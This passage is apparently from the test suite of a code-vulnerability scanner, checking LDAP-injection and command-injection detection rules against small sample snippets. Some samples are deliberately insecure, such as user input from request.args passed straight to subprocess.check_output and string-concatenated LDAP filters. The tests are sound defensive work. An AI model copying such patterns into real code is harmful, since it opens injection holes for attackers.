            assert!(ids.contains(ex.id), "extra {} has no matching rule", ex.id);
            assert!(!ex.exploit.is_empty() && !ex.fix_code.is_empty());
            if let Some(s) = ex.sink {
                assert!(Regex::new(s).is_ok(), "bad sink for {}", ex.id);
            }
        }
    }

    #[test]
    fn ldap_sink_corroboration() {
        // Concatenation alone: no corroborating sink in the file.
        let concat_only = "String f = \"(uid=\" + user + \")\";\n";
        assert!(!sink_present("VS-JV-016", concat_only));
        // Same file also performs the LDAP search: corroborated.
        let with_sink = "String f = \"(uid=\" + user + \")\";\nctx.search(base, f, controls);\n";
        assert!(sink_present("VS-JV-016", with_sink));
        assert!(extra_for("VS-JV-016").is_some());
    }

    #[test]
    fn heuristic_patterns_compile_and_match() {
        // Every heuristic's taint and sink must compile.
        for h in HEURISTICS {
            assert!(Regex::new(h.taint).is_ok() && Regex::new(h.sink).is_ok(), "bad {}", h.id);
        }
        // User input + a system call on one line → suspected command injection.
        let hit = line_heuristics("run(subprocess.check_output(request.args['cmd']))", Language::Python);
        assert!(hit.iter().any(|h| h.id == "VS-EXP-001"), "EXP-001 should fire");
        // No user-input token on the line → no heuristic.
        let clean = line_heuristics("subprocess.check_output(['ls', '-la'])", Language::Python);
        assert!(clean.is_empty(), "no taint token, should not fire");
        assert!(!content_has_taint("let x = compute(2 + 2);"));
        assert!(content_has_taint("value = request.args['id']"));
    }

    #[test]
    fn clean_code_produces_no_hits() {
        let code = "fn add(a: u64, b: u64) -> u64 {\n    a + b\n}\n";
        assert!(hit_ids(code, Language::Rust, "src/math.rs").is_empty());
    }
}
